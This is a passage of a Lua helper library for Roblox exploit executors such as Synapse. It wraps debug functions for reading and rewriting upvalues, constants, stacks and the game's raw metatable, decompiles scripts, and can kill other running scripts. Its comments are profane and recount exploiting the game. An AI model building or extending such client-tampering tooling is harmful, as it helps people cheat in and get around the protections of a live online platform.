			fcd = fireclickdetector or rawget(shared.dbg, "fcd") or dowarn("shared.dbg.fcd needs to be set to 'fireclickdetector' function!"),
			cons = getconnections or rawget(shared.dbg, "cons") or dowarn("shared.dbg.cons needs to be set to 'getconnections' function!"),
			su = debug.setupvalue or setupvalue or rawget(shared.dbg, "su") or dowarn("shared.dbg.su needs to be set to 'setupvalue' function!"),
			sun = debug.setupvaluename or setupvaluename or rawget(shared.dbg, "sun") or dowarn("shared.dbg.sun needs to be set to 'setupvaluename' function!"),
			gus = debug.getupvalues or getupvalues or rawget(shared.dbg, "gus" or dowarn("shared.dbg.gus needs to be set to 'getupvalues' function!")),
			gu = debug.getupvalue or getupvalue or rawget(shared.dbg, "gu" or dowarn("shared.dbg.gu needs to be set to 'getupvalue' function!")),
			gp = getproperties or getprops or rawget(shared.dbg, "gp" or dowarn("shared.dbg.gp needs to be set to 'getproperties' function!")),
			sc = debug.setconstant or setconstant or rawget(shared.dbg, "sc" or dowarn("shared.dbg.sc needs to be set to 'setconstant' function!")),
			gst = debug.getstack or getstack or rawget(shared.dbg, "gst" or dowarn("shared.dbg.gst needs to be set to 'getstack' function!")),
			gcs = debug.getconstants or getconstants or rawget(shared.dbg, "gcs") or dowarn("shared.dbg.gcs needs to be set to 'getconstants' function!"),
			gc = debug.getconstant or getconstant or rawget(shared.dbg, "gc") or dowarn("shared.dbg.gc needs to be set to 'getconstant' function!"),
			gr = debug.getregistry or syn_getreg or getreg or getregistry or rawget(shared.dbg, "gr") or dowarn("shared.dbg.gr needs to be set to 'getregistry' function!"),
			gcsrc = syn_getcallingscript or getcallingscript or get_calling_script or rawget(shared.dbg, "gcsrc") or dowarn("shared.dbg.gcsrc needs to be set to 'getcallingscript' function!"),
			ire = is_redirection_enabled or rawget(shared.dbg, "ire") or dowarn("shared.dbg.ire needs to be set to 'is_redirection_enabled' function!"),
			kp = keypres or rawget(shared.dbg, "kp") or dowarn("shared.dbg.kp needs to be set to 'keypres' function!"),
			glm = syn_getloadedmodules or getloadedmodules or rawget(shared.dbg, "glm") or dowarn("shared.dbg.glm needs to be set to 'getloadedmodules' function!"),
			gni = getnilinstances or get_nil_instances or rawget(shared.dbg, "gni") or dowarn("shared.dbg.gni needs to be set to 'getnilinstances' function!"),
			ggc = getgc or syn_getgc or rawget(shared.dbg, "ggc") or dowarn("shared.dbg.ggc needs to be set to 'getgc' function!"),
			ggc = getgc or syn_getgc or rawget(shared.dbg, "ggc") or dowarn("shared.dbg.ggc needs to be set to 'getgc' function!"),
			gi = getinfo or debug.getinfo or rawget(shared.dbg, "gi") or dowarn("shared.dbg.gi needs to be set to 'getinfo' function!"),
			gin = getinstances or rawget(shared.dbg, "gin") or dowarn("shared.dbg.gin needs to be set to 'getinstances' function!"),
			gge = syn_getgenv or getgenv or rawget(shared.dbg, "gge") or dowarn("shared.dbg.gge needs to be set to 'getgenv' function!"),
			gncm = getnamecallmethod or rawget(shared.dbg, "gncm") or dowarn("shared.dbg.gncm needs to be set to 'getnamecallmethod' function!"),
			sncm = setnamecallmethod or rawget(shared.dbg, "sncm") or dowarn("shared.dbg.sncm needs to be set to 'setnamecallmethod' function!"),
			rq = require or rawget(shared.dbg, "rq") or dowarn("shared.dbg.rq needs to be set to 'require' function!"),
			gse = getsenv or syn_getsenv or rawget(shared.dbg, "gse") or dowarn("shared.dbg.gse needs to be set to 'getsenv' function!"),
			cc = syn_checkcaller or checkcaller or rawget(shared.dbg, "cc") or dowarn("shared.dbg.cc needs to be set to 'checkcaller' function!"),
			gme = syn_getmenv or getmenv or rawget(shared.dbg, "gme") or dowarn("shared.dbg.gme needs to be set to 'getmenv' function!"),
			ss = debug.setstack or setstack or rawget(shared.dbg, "ss") or dowarn("shared.dbg.ss needs to be set to 'setstack' function!"),
			gre = getrenv or rawget(shared.dbg, "gre") or dowarn("shared.dbg.gre needs to be set to 'getrenv' function!"),
			gs = getscripts or rawget(shared.dbg, "gs") or dowarn("shared.dbg.gs needs to be set to 'getscripts' function!"),
			chkc = checkcaller or rawget(shared.dbg, "chkc") or dowarn("shared.dbg.chkc needs to be set to 'checkcaller' function!"),
			ncc = syn_newcclosure or newcclosure or rawget(shared.dbg, "ncc") or dowarn("shared.dbg.ncc needs to be set to 'newcclosure' function!"),
			ums = unlockmodulescript or unlock_modulescript or rawget(shared.dbg, "ums") or dowarn("shared.dbg.ums needs to be set to 'unlockmodulescript' function!"),
			cf = clonefunction or clone_function or clone_closure or rawget(shared.dbg, "cf") or dowarn("shared.dbg.cf needs to be set to 'clonefunction' function!"),
			gf = debug.getfenv or getfenv or rawget(shared.dbg, "gf") or dowarn("shared.dbg.gf needs to be set to 'getfenv' function!"),
			fs = firesignal or fire_signal or rawget(shared.dbg, "fs") or dowarn("shared.dbg.fs needs to be set to 'firesignal' function!"),
		}, {__index = debug})
		if type(syn) == "table" and not syn.Compat then
			pcall(function()
				dbg.sf = is_synapse_function or rawget(shared.dbg, "sf") or dowarn("shared.dbg.sf needs to be set to 'is_synapse_function' function!")
				dbg.sec = syn.secure_call or rawget(shared.dbg, "sec") or dowarn("shared.dbg.sec needs to be set to 'syn.secure_call' function!")
				dbg.cr = syn.cache_replace or rawget(shared.dbg, "cr") or dowarn("shared.dbg.cr needs to be set to 'syn.cache_replace' function!")
				dbg.req = syn.request or rawget(shared.dbg, "req") or dowarn("shared.dbg.req needs to be set to 'syn.request' function!")
				dbg.pg = syn.protect_gui or rawget(shared.dbg, "pg") or dowarn("shared.dbg.pg needs to be set to 'syn.protect_gui' function!")
				dbg.upg = syn.unprotect_gui or rawget(shared.dbg, "upg") or dowarn("shared.dbg.upg needs to be set to 'syn.unprotect_gui' function!")
				dbg.ci = syn.cache_invalidate or rawget(shared.dbg, "ci") or dowarn("shared.dbg.ci needs to be set to 'syn.cache_invalidate' function!")
				dbg.ic = syn.is_cached or rawget(shared.dbg, "ic") or dowarn("shared.dbg.ic needs to be set to 'syn.is_cached' function!")
			end)
		end
		dowarn, didwarn = nil, nil
		genv.Color3, genv.Instance, genv.math, genv.string, genv.table, genv.Vector3, genv.Pepsi, genv.Region3, genv.CFrame, genv.Ray, genv.utf8 = Color3, Instance, math, string, table, Vector3, Pepsi, Region3, CFrame, Ray, utf8
		delay(3, function() -- Eh... Fucket
			genv = getgenv()
			genv.Color3, genv.Instance, genv.math, genv.string, genv.table, genv.Vector3, genv.Pepsi, genv.Region3, genv.CFrame, genv.Ray, genv.utf8 = Color3, Instance, math, string, table, Vector3, Pepsi, Region3, CFrame, Ray, utf8
		end)
		local stuffs = 0
		if dbg and dbg.grmt then
			pcall(function()
				genv.EmergancyMetatableBackup = table.merge({}, dbg.grmt(game))
				genv.MetaBackup = table.merge({}, dbg.grmt(game))
				Pepsi.MetaBackup = table.merge({}, dbg.grmt(game))
				shared.MetaBackup = table.merge({}, dbg.grmt(game))
				_G.MetaBackup = table.merge({}, dbg.grmt(game)) -- Ever fucked up SO FUCKING hard that you wish you had made meta backups (5 times)?
				-- Got a fucking story to share.  No. You stay put damnit, you will listen.... or read... because i just FUCKING know im gonna take my time writing this.
				--[[
					It's wednesday, roblox had updated, and I was one of the few who didn't close roblox to extend my exploit time.
					I was making a deep function hook inspector thingy. A godly tool btw. I made a critical change to the
					game's raw metatable without making a backup (I was SURE it wouldnt fuck me up). 
					Well, I fucked up. And hard. I WAS NOT about to lose access to aynpase until it got updated, so what I did,
					was fucking exhausting. I DID in fact make a backup in the original source that fucked the meta, however
					this backup was NOT set globally, so I couldn't access it outside of the source (without deep digging)
					I went BALLS DEEP into roblox to fetch the backup from the old source. As soon as i found and applied it...
					Roblox crashed. I was fucking pissed. I lost 2.1 hours finding a fucking upvalue. FOUND IT, then roblox died.
					
					Great, it's fine. really.
					Alright Pepsi's small tale is finsihed for now. To be continued...
					
					Word of advice: 'Ninjas have two legs.' (yes, really!)
				]]
			end)
			if (debug.getconstant or getconstant) and (debug.setconstant or setconstant) and (debug.getconstants or getconstants) then
				stuffs = 1 + stuffs
				function dbg.gc(func, slot, ...) -- Two functions with one name. ^_^  gcs was taken by get calling script
					if type(slot) ~= "number" then
						return (debug.getconstants or getconstants)(func, slot, ...)
					else
						return (debug.getconstant or getconstant)(func, slot, ...)
					end
				end
				function dbg.con(func, slot, val, ...)
					if (type(func) ~= "function" and type(func) ~= "number") or (type(slot) ~= "nil" and type(slot) ~= "number") or (type(val) == "nil" and type(slot) ~= "nil") then
						Pepsi.Arg(func, {"function", "number"}, 1, "dbg.con")
						Pepsi.Arg(slot, {"number", "nil"}, 1, "dbg.con")
						Pepsi.Arg(func, "nil", 1, "dbg.con", "Needs a new value. If it is to be nil, use 'VOID'", true)
					end
					if type(func) == "number" then
						func = 1 + func
						if dbg.vl and not dbg.vl(func) then
							return Pepsi.Error("Invalid level:", func)
						end
					end
					if type(slot) == "number" then
						if type(val) ~= "nil" then
							if val == "VOID" then
								val = nil
							end
							return (debug.setconstant or setconstant)(func, slot, val, ...)
						end
						return (debug.getconstant or getconstant)(func, slot, val, ...)
					end
					return (debug.getconstants or getconstants)(func, slot, val, ...)
				end
			end
			if (debug.getupvalue or getupvalue) and (debug.setupvalue or setupvalue) and (debug.getupvalues and getupvalues) then
				stuffs = 1 + stuffs
				function dbg.up(func, slot, val, ...)
					if (type(func) ~= "function" and type(func) ~= "number") or (type(slot) ~= "nil" and type(slot) ~= "number") or (type(val) == "nil" and type(slot) ~= "nil") then
						Pepsi.Arg(func, {"function", "number"}, 1, "dbg.up")
						Pepsi.Arg(slot, {"number", "nil"}, 1, "dbg.up")
						Pepsi.Arg(func, "nil", 1, "dbg.up", "Needs a new value. If it is to be nil, use 'VOID'", true)
					end
					if type(func) == "number" then
						func = 1 + func
						if dbg.vl and not dbg.vl(func) then
							return Pepsi.Error("Invalid level:", func)
						end
					end
					if type(slot) == "number" then
						if type(val) ~= "nil" then
							if val == "VOID" then
								val = nil
							end
							return (debug.setupvalue or setupvalue)(func, slot, val, ...)
						end
						return (debug.getupvalue or getupvalue)(func, slot, val, ...)
					end
					return (debug.getupvalues or getupvalues)(func, slot, val, ...)
				end
			end
			if (debug.getstack or getstack) and (debug.setstack or setstack) then
				stuffs = 1 + stuffs
				function dbg.stack(func, slot, val, ...)
					if type(func) ~= "number" or (type(slot) ~= "nil" and type(slot) ~= "number") or (type(val) == "nil" and type(slot) ~= "nil") then
						Pepsi.Arg(func, {"number"}, 1, "dbg.stack")
						Pepsi.Arg(slot, {"number", "nil"}, 1, "dbg.stack")
						Pepsi.Arg(func, "nil", 1, "dbg.stack", "Needs a new value. If it is to be nil, use 'VOID'", true)
					end
					if type(func) == "number" then
						func = 1 + func
						if dbg.vl and not dbg.vl(func) then
							return Pepsi.Error("Invalid level:", func)
						end
					end
					if val ~= nil then
						if val == "VOID" then
							val = nil
						end
						return (debug.setstack or setstack)(func, slot, val, ...)
					end
					return (debug.getstack or getstack)(func, slot, val, ...)
				end
			end
		end
		if type(dbg) == "table" and type(debug.getinfo) == "function" and type(getfenv) == "function" and type(setfenv) == "function" and type(debug.getstack) == "function" then
			if stuffs >= 3 and decompile and debug.validlevel then
				function dbg.dump(thing, req)
					local data = {}
					local t = typeof(thing)
					if t == "Instance" then
						if thing:IsA("LuaSourceContainer") and thing.ClassName ~= "Script" then
							if thing.ClassName == "ModuleScript" and req then
								local res = {pcall(require, thing)}
								data.Require = res[2]
							end
							local res = {pcall(getsenv, thing)}
							data.Senv = res[2]
							function data.GetSource(timeout)
								timeout = (timeout and tonumber(timeout)) or 60
								local res = {pcall(decompile, thing)}
								data.Source = res[2]
								return res[2]
							end
						elseif thing:IsA("TriangleMeshPart") or thing.ClassName == "Terrain" then
							local res = {pcall(getspecialinfo, thing)}
							data.Special = res[2]
						end
					elseif t == "function" or t == "number" then
						if t == "number" then
							--thing = 1 + thing
							if not debug.validlevel(thing) then
								return {"Invalid level: " .. tostring(thing)}
							end
						end
						data.Upvalues = ({pcall(debug.getupvalues, thing)})[2]
						data.Constants = ({pcall(debug.getconstants, thing)})[2]
						data.Fenv = ({pcall(getfenv, thing)})[2]
						data.Info = ({pcall(debug.getinfo, thing)})[2]
						if t == "number" then
							data.Stack = ({pcall(debug.getstack, thing)})[2]
						end
					elseif t == "RBXScriptConnection" then
						data.Connections = ({pcall(getconnections, thing)})[2]
					end
					return data
				end
			end
			function dbg.attach(id)
				if type(Pepsi) ~= "table" then
					Pepsi = {}
				end
				if type(Pepsi.Scripts) ~= "table" then
					Pepsi.Scripts = {}
				end
				local info = debug.getinfo(2)
				local stck = debug.getstack(2)
				id = (type(id) ~= "nil" and id) or info.short_src or coroutine.running() or Pepsi.GUID()
				if type(id) ~= "nil" and rawget(Pepsi.Scripts, id) then
					local orig = id
					if typeof(id) == "Instance" then
						local ss, s, nid = pcall(pcall, id.GetDebugId, id)
						if s and ss and nid and rawget(Pepsi.Scripts, nid) then
							nid = getfenv(2).script
							if typeof(nid) == "Instance" and rawget(Pepsi.Scripts, nid) then
								local ss, s, nid = pcall(pcall, id.GetDebugId, nid)
								if ss and s and nid and rawget(Pepsi.Scripts, nid) then
									warn("Debug Id " .. tostring(orig) .. " already exists!")
								else
									id = nid
								end
							else
								id = nid
							end
						else
							id = nid
						end
					end
					id = tostring((type(id) ~= "nil" and id) or getfenv(2).script or coroutine.running())
					while id and rawget(Pepsi.Scripts, id) do
						id = Pepsi.GUID()
					end
				end
				local data = {Info = rawset(rawset(info, "id", id), "from", getfenv(2).script), Stack = stck}
				function data.Kill(s, msg)
					if type(s) == "table" and type(s[1]) == "table" and type(s[1].func) == "function" then
						if s[1].what == "C" then
							return warn("Cannot kill", s[1].id)
						end
						local fenv = getfenv(s[1].func)
						function fenv:__index(k)
						    error(msg, 2)
						end
						setfenv(s[1].func, setmetatable({}, fenv))
					end
				end
				function data.Remove(s, msg)
					if type(s) == "table" then
						if type(s.Kill) == "function" then
							s:Kill(msg or ("Removing " .. s[1].id))
						end
						delay(1, function()
							Pepsi.Scripts[s] = nil
						end)
					end
				end
				rawset(Pepsi.Scripts, (type(id) ~= "nil" and id) or getfenv(2).script, data)
			end
			pcall(pcall, dbg.attach, "Pepsi's Utilities")
		end
		stuffs = nil
	end
end)

pcall(function()
	if type(dbg) ~= "table" and type(getfenv) == "function" then
		local _, env = pcall(getfenv, 2)
		if type(env) == "table" then
	--		local dbg = setmetatable({}, {__index = function(_, opt)
	--			return function(...)
	--				warn(opt, "is not available. Arguments:", ...)
	--			end
	--		end})
			local dbg = {}
			function dbg.attach(id)
				pcall(function()
					warn("attach is not available.", tostring((id and ("ID: " .. tostring(id))) or ""))
				end)
			end
			env.dbg = dbg
		end
	elseif type(dbg) == "table" then
		local of = dbg.attach or function(id)
			pcall(function()
				warn("attach is not available.", tostring((id and ("ID: " .. tostring(id))) or ""))
			end)
		end
		function dbg.attach(...)
			pcall(pcall, of, ...)
		end
	end
end)

if true or not auto_exec then -- Super secret stuff. Nah, jk... Just a setting to prevent the script from a pre-mature EoF.
	return (function(...) -- Fuck "module can only return 1 result".
		return setmetatable({}, {__index = Color3}), setmetatable({}, {__index = Instance}), setmetatable({}, {__index = math}), setmetatable({rtl = utf8.char(8238)}, {__index = string}), setmetatable({}, {__index = table}), setmetatable({}, {__index = Vector3}), Pepsi, setmetatable({}, {__index = Region3}), setmetatable({}, {__index = CFrame}), setmetatable({}, {__index = Ray}), setmetatable({}, {__index = utf8})
	end)
end
return Pepsi.DummyFunc -- Comes in handy lol

-- Non-updated hot words for this script (23rd of November, 2020, 9:53 AM (EST);
-- Pepsi: 1451
-- Loser: 120
-- Fuck: 35
-- Dummy: 15
-- Ninja: 4
